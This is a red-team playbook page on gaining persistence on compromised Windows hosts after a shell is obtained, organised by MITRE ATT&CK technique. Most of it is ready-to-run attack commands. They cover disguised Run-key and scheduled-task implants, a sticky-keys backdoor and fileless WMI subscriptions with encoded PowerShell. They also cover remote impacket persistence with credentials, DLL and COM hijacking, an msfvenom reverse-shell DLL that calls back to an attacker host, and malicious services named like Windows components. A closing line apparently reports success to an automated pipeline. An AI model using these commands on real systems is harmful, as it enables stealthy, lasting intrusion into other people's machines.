# RT09: Persistence

**MITRE:** T1547.001, T1053.005, T1546.003, T1574.001, T1574.012 | **When:** Shell obtained - need to survive reboot/logoff.

## Registry Run Keys (T1547.001)

```powershell
# HKCU (no elevation):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Users\Public\update.exe" /f

# HKLM (requires admin):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d "C:\Windows\Temp\svc.exe" /f

# Logon script (user):
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\Temp\logon.bat" /f

# Debugger hijack (T1546.012) - triggers when any user launches <target>.exe:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
# ^ sethc.exe = sticky keys -> cmd at lock screen (requires SYSTEM or admin)
```

## Scheduled Tasks (T1053.005)

```powershell
# Create scheduled task (persistence + privilege):
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Windows\Temp\update.exe" /sc ONLOGON /ru SYSTEM /f

# Via PowerShell (harder to detect than schtasks.exe):
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\beacon.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force

# Remote scheduled task (T1053.005 lateral):
schtasks /create /s <TARGET> /u administrator /p 'Password!' /tn "Updater" /tr "powershell -enc <BASE64>" /sc ONCE /st 23:59 /f
```

## WMI Event Subscription (T1546.003) - Fileless, survives reboots

```powershell
# Permanent WMI subscription (triggers every 30s):
$FilterArgs = @{
  Name = 'WindowsUpdate'
  EventNameSpace = 'root\CimV2'
  QueryLanguage = 'WQL'
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

$ConsumerArgs = @{
  Name = 'WindowsUpdate'
  CommandLineTemplate = "powershell -nop -w hidden -enc <BASE64>"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$Filter; Consumer=$Consumer}

# Via impacket remote:
wmipersist.py corp.local/administrator:'Password!'@<TARGET_IP> install -name WindowsUpdate -command "powershell -enc <BASE64>"
```

## DLL Hijacking (T1574.001)

```bash
# Find DLL hijack opportunities (missing DLLs in writable dirs):
# Tool: Process Monitor (ProcMon) - filter: PATH NOT FOUND + .dll
# Tool: PowerSploit Find-PathDLLHijack, Find-ProcessDLLHijack

# High-value targets (run from CWD or missing system DLL):
# - WindowsCodecs.dll (calc.exe hijack)
# - amsi.dll (many AV scanners)
# - version.dll (loaded by many apps)

# Create malicious DLL (exports must match expected):
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f dll -o version.dll
# Place in hijackable path, wait for app restart
```

## COM Hijacking (T1574.012) - HKCU overrides HKLM, no elevation

```powershell
# Find COM hijack candidates (missing HKCU entries):
# Subkeys in HKCU\Software\Classes\CLSID override HKLM without UAC

# Example: hijack CLSID called by Task Scheduler / Explorer
reg add "HKCU\Software\Classes\CLSID\{<GUID>}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{<GUID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

# Enumerate vulnerable CLSIDs:
# Tool: acCOMplice, COM Hijacking via ProcMon (filter: HKCU CLSID NOT FOUND)
```

## Boot/Pre-OS Persistence (T1542)

```bash
# Bootkit (requires SYSTEM + secure boot disabled):
# bootkits: Bootmgr infection, VBR patch, UEFI implant

# Safer: BCD modification (requires admin):
bcdedit /set {default} bootstatuspolicy ignoreallfailures
# ^ disables boot failure recovery checks

# Malicious Windows Service (T1543.003):
sc create EvilSvc binpath= "C:\Windows\Temp\svc.exe" start= auto
sc start EvilSvc
# Or via impacket (remote):
services.py corp.local/administrator:'Password!'@<TARGET_IP> create -name EvilSvc -display_name "Windows Update" -path "C:\Windows\Temp\svc.exe"
```

**Signal:** `emit_signal SURFACE_FOUND "Persistence established via <method> on <host>" "main/redteam" 0.88`
